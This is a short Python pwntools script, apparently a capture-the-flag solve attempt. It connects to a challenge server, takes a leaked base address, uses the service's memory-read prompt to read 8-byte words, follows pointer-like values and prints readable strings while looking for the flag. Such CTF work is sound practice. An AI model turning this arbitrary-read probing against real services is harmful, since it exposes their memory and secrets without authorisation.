from pwn import *
import re

HOST = 'zerodayheroes-74cbaa42-doityourself2.kongsberg-ctf.com'
PORT = 1337

context.log_level = 'info'
io = remote(HOST, PORT, ssl=True)

# Get the base address
intro = io.recvline_contains(b'flag is over at').decode()
banner2 = io.recvline().decode()
print(intro.strip())
print(banner2.strip())

m = re.search(r'flag is over at (0x[0-9a-fA-F]+)', intro)
base = int(m.group(1), 16)
print(f'Dict base: {hex(base)}')

def read8(addr):
    io.sendline(hex(addr).encode())
    line = io.recvline(timeout=3).decode().strip()
    if 'illegal memory address' in line:
        return None
    try:
        _, data = line.split(': ')
        return bytes.fromhex(data.strip())
    except:
        return None

print("\n=== Testing basic memory reads ===")

# Test if we can read the dict object at all
for i in range(8):
    addr = base + i*8
    data = read8(addr)
    if data:
        val = u64(data)
        print(f'{hex(addr)}: {data.hex()} -> {val:#018x} ({val})')
        
        # If this looks like a pointer, test reading from it
        if 0x400000 < val < 0x800000000000:
            print(f'  Trying to read from pointer {val:#x}...')
            ptr_data = read8(val)
            if ptr_data:
                # Check for printable content
                printable = ''.join(chr(b) if 32 <= b <= 126 else '.' for b in ptr_data)
                print(f'  -> {ptr_data.hex()} = "{printable}"')
    else:
        print(f'{hex(addr)}: Failed to read')

print("\n=== Looking for string patterns ===")
# Try some common offsets where dict entries might be
test_addrs = [
    base + 0x18,  # Common dict entry pointer location
    base + 0x20,  
    base + 0x28,
    base + 0x30,
]

for addr in test_addrs:
    data = read8(addr)
    if data:
        val = u64(data)
        if 0x400000 < val < 0x800000000000:
            # Try reading from this pointer
            ptr_data = read8(val)
            if ptr_data:
                chars = []
                for b in ptr_data:
                    if 32 <= b <= 126:
                        chars.append(chr(b))
                    elif b == 0:
                        break
                text = ''.join(chars)
                if text:
                    print(f'Found text at {val:#x}: "{text}"')

io.close()